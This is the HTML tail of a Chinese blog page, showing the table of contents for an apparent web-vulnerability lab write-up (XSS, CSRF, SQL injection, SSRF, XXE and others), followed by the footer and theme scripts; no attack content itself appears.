<span class="nav-text">垂直越权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#URL%E9%87%8D%E6%96%B0%E5%90%91"><span class="nav-number">11.</span> <span class="nav-text">URL重新向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSRF"><span class="nav-number">12.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-get"><span class="nav-number">12.1.</span> <span class="nav-text">CSRF(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-post"><span class="nav-number">12.2.</span> <span class="nav-text">CSRF(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-Token"><span class="nav-number">12.3.</span> <span class="nav-text">CSRF Token</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cross-Site-Scripting"><span class="nav-number">13.</span> <span class="nav-text">Cross-Site Scripting</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="nav-number">13.1.</span> <span class="nav-text">反射型xss(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="nav-number">13.2.</span> <span class="nav-text">反射型xss(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">13.3.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8Bxss"><span class="nav-number">13.4.</span> <span class="nav-text">DOM型xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM%E5%9E%8Bxss-x"><span class="nav-number">13.5.</span> <span class="nav-text">DOM型xss-x</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E7%9B%B2%E6%89%93"><span class="nav-number">13.6.</span> <span class="nav-text">xss盲打</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">13.7.</span> <span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">13.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">13.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA-1"><span class="nav-number">13.10.</span> <span class="nav-text">xss之href输出</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">14.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E8%AF%AD%E8%A8%80%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">14.1.</span> <span class="nav-text">部分语言外部实体类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="nav-number">14.2.</span> <span class="nav-text">XXE漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0%E5%88%A9%E7%94%A8"><span class="nav-number">14.3.</span> <span class="nav-text">简述利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF"><span class="nav-number">15.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-curl"><span class="nav-number">15.1.</span> <span class="nav-text">SSRF(curl)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-file-get-content"><span class="nav-number">15.2.</span> <span class="nav-text">SSRF(file_get_content)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">16.</span> <span class="nav-text">PHP反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8EPHP%EF%BC%88%E5%8F%8D%EF%BC%89%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%89%E5%85%B3%E7%9A%84%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="nav-number">16.1.</span> <span class="nav-text">与PHP（反）序列化有关的魔法函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%B5%8B%E8%AF%95"><span class="nav-number">16.2.</span> <span class="nav-text">反序列化学习与测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%9C%A8%E7%BA%BF%E8%BF%90%E8%A1%8C%E5%B9%B3%E5%8F%B0"><span class="nav-number">16.3.</span> <span class="nav-text">php在线运行平台</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sql-Inject"><span class="nav-number">17.</span> <span class="nav-text">Sql Inject</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sql%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0"><span class="nav-number">17.1.</span> <span class="nav-text">Sql语法学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">17.2.</span> <span class="nav-text">常见注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-post"><span class="nav-number">17.3.</span> <span class="nav-text">数字型注入(post)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get"><span class="nav-number">17.4.</span> <span class="nav-text">字符型注入(get)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">17.5.</span> <span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">17.6.</span> <span class="nav-text">xx型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cinsert-x2F-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">17.7.</span> <span class="nav-text">“insert&#x2F;update”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">17.8.</span> <span class="nav-text">“delete”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">17.9.</span> <span class="nav-text">“http header”注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8-base-on-boolian"><span class="nav-number">17.10.</span> <span class="nav-text">盲注(base on boolian)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8-base-on-time"><span class="nav-number">17.11.</span> <span class="nav-text">盲注(base on time)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">17.12.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E2%80%93XSS%E5%90%8E%E5%8F%B0"><span class="nav-number">18.</span> <span class="nav-text">管理工具–XSS后台</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie%E6%90%9C%E9%9B%86"><span class="nav-number">18.1.</span> <span class="nav-text">cookie搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%93%E9%B1%BC%E7%BB%93%E6%9E%9C"><span class="nav-number">18.2.</span> <span class="nav-text">钓鱼结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="nav-number">18.3.</span> <span class="nav-text">键盘记录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">19.</span> <span class="nav-text">后记</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2022 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>